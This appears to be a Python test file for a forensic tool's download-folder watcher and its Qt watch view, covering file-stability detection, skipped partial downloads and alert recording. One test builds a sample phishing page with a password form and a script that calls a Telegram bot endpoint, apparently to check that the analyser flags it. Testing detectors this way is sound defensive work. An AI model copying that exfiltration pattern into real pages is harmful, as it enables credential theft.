"""Watch-Folder (core/watcher.py) und die WATCH-Ansicht."""
import os
import time

import pytest

from core.watcher import FolderWatcher
from engines import run_forensic


def _w(tmp_path, **kw):
    return FolderWatcher([tmp_path], analyze_fn=lambda p, **k: {"ok": True}, **kw)


def test_existing_files_are_ignored_and_new_ones_wait_until_stable(tmp_path):
    (tmp_path / "alt.txt").write_text("schon da")
    w = _w(tmp_path)
    w.prime()
    assert w.poll_once() == []
    (tmp_path / "neu.txt").write_text("frisch")
    assert w.poll_once() == []                  # erst gesehen → pending
    ready = w.poll_once()                       # unverändert → fertig
    assert [os.path.basename(p) for p in ready] == ["neu.txt"]
    assert w.poll_once() == []                  # nicht doppelt


def test_growing_file_waits_and_partial_downloads_are_skipped(tmp_path):
    w = _w(tmp_path)
    w.prime()
    f = tmp_path / "setup.exe"
    f.write_bytes(b"a" * 10)
    (tmp_path / "video.mp4.crdownload").write_bytes(b"x" * 10)
    (tmp_path / "~$brief.docx").write_bytes(b"x")
    assert w.poll_once() == []
    f.write_bytes(b"a" * 20)                    # wächst noch
    assert w.poll_once() == []
    assert [os.path.basename(p) for p in w.poll_once()] == ["setup.exe"]
    assert w.poll_once() == []


def test_modified_and_redownloaded_files_are_checked_again(tmp_path):
    w = _w(tmp_path)
    w.prime()
    f = tmp_path / "a.txt"
    f.write_text("1")
    w.poll_once(); assert w.poll_once()
    f.write_text("22")
    w.poll_once(); assert w.poll_once()
    f.unlink()
    w.poll_once()
    f.write_text("1")
    w.poll_once(); assert w.poll_once()


def test_empty_files_and_subfolders(tmp_path):
    (tmp_path / "sub").mkdir()
    flat = _w(tmp_path)
    deep = _w(tmp_path, recursive=True)
    flat.prime(); deep.prime()
    (tmp_path / "leer.txt").write_bytes(b"")
    (tmp_path / "sub" / "x.txt").write_text("x")
    for _ in range(2):
        a, b = flat.poll_once(), deep.poll_once()
    assert a == [] and [os.path.basename(p) for p in b] == ["x.txt"]


def test_threads_analyse_new_files(tmp_path):
    got = []
    w = FolderWatcher([tmp_path], analyze_fn=lambda p, **k: {"ok": True, "p": p}, interval=0.05,
                      on_result=lambda p, r: got.append(os.path.basename(p))).start()
    try:
        (tmp_path / "live.txt").write_text("hallo")
        for _ in range(100):
            if got:
                break
            time.sleep(0.05)
    finally:
        w.stop()
    assert got == ["live.txt"] and not w.running


@pytest.fixture
def qapp():
    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    QtWidgets = pytest.importorskip("PyQt6.QtWidgets")
    return QtWidgets.QApplication.instance() or QtWidgets.QApplication([])


def test_watch_view_records_and_alerts(tmp_path, qapp):
    from PyQt6.QtCore import QSettings
    from core.history import HistoryDB
    from gui.history_view import HistoryView
    from gui.watch_view import WatchView

    watched = tmp_path / "Downloads"
    watched.mkdir()
    db = HistoryDB(tmp_path / "h.db")
    settings = QSettings(str(tmp_path / "watch.ini"), QSettings.Format.IniFormat)
    view = WatchView(analyze_fn=run_forensic, history=HistoryView(db=db), settings=settings)
    view.add_folder(str(watched))
    view.add_folder(str(watched))                    # keine Duplikate
    assert view.folders() == [str(watched)]

    alerts = []
    view.alert.connect(alerts.append)
    ok = watched / "notiz.txt"
    ok.write_text("einkaufsliste")
    bad = watched / "rechnung.html"
    bad.write_text('<form action="https://x.invalid/p"><input type=password></form>'
                   '<script>fetch("https://api.telegram.org/bot1/sendMessage")</script>')
    for p in (ok, bad):
        view._on_result(str(p), run_forensic(str(p)))

    assert view.table.rowCount() == 2
    assert view.table.item(0, 1).text() == "rechnung.html"          # neueste oben
    assert [a["name"] for a in alerts] == ["rechnung.html"]
    case = [c for c in db.list_cases() if c["name"] == "Watch-Folder"]
    assert case and case[0]["analyses"] == 2

    # Einstellungen überleben einen Neustart, Autostart setzt die Überwachung fort
    view.start()
    assert view.watching
    view2 = WatchView(analyze_fn=run_forensic, history=HistoryView(db=db), settings=settings)
    view.stop()
    settings.setValue("active", True)
    view2._load_settings()
    assert view2.folders() == [str(watched)]
    view2.autostart()
    assert view2.watching
    view2.stop()
    assert not view2.watching
